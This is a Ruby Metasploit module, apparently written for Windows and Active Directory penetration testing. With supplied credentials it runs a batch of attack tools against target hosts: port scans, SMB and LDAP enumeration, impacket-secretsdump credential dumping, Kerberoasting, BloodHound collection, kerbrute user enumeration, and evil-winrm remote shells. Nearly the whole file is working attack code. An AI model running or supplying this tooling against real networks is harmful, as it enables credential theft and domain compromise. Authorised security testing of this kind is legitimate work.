require 'msf/core'
require 'thread'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote
  include Msf::Auxiliary::Scanner  # Enables scanning multiple targets

  def initialize
    super(
      'Name'        => 'Windows Enumeration Module',
      'Description' => 'Performs active enumeration on Windows targets using multiple recon tools',
      'Author'      => ['YourName'],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptAddressRange.new('RHOSTS', [true, 'Target Windows IP address(es)']),
        OptString.new('DOMAIN', [true, 'Domain name']),
        OptString.new('USERNAME', [true, 'Valid Windows username']),
        OptString.new('PASSWORD', [true, 'Password for the Windows user']),
        OptString.new('OUTPUT_FILE', [true, 'Output file', 'windows_enum_results.txt'])
      ]
    )
  end

  def run_host(ip)
    domain = datastore['DOMAIN']
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    output_file = datastore['OUTPUT_FILE']

    print_status("Starting Windows enumeration on #{ip}...")

    commands = [
      "nmap #{ip}",
      "nmap -T4 -p- --open #{ip}",
      "nmap -sC -sV #{ip}",
      "crackmapexec smb #{ip} -u #{username} -p #{password}",
      "impacket-secretsdump #{username}:#{password}@#{ip}",
      "GetUserSPNs.py #{domain}/#{username}:#{password} -dc-ip #{ip}",
      "bloodhound-python -u #{username} -p #{password} -d #{domain} -c All --zip",
      "ldapsearch -x -h #{ip} -b 'dc=#{domain.gsub('.', ',dc=')}'",
      "smbmap -H #{ip} -u #{username} -p #{password}",
      "enum4linux-ng -A #{ip}",
      "kerbrute userenum -d #{domain} --dc #{ip} userlist.txt",
      "ldapdomaindump ldap://#{ip}",
      "rdp-sec-check -t #{ip}",
      "evil-winrm -i #{ip} -u #{username} -p #{password}",
      "winrm-cli #{ip} -u #{username} -p #{password}",
      "rpcclient -U #{username}%#{password} #{ip} -c 'enumdomusers'",
      "gpoenum #{ip} -u #{username} -p #{password}"
    ]

    queue = Queue.new
    commands.each { |cmd| queue.push(cmd) }

    threads = []
    5.times do
      threads << Thread.new do
        until queue.empty?
          cmd = queue.pop(true) rescue nil
          next unless cmd

          print_status("Running: #{cmd}")
          IO.popen(cmd) do |io|
            io.each_line do |line|
              print_good(line.chomp)
              File.open(output_file, 'a') { |file| file.puts(line.chomp) }
            end
          end

          # Store results in Metasploit DB after each command
          result = File.read(output_file)
          framework.db.report_note(
            host: ip,
            type: "windows_enum",
            data: result
          )
        end
      end
    end

    threads.each(&:join)

    print_status("Windows enumeration for #{ip} complete! Results saved to #{output_file}.")
  end
end

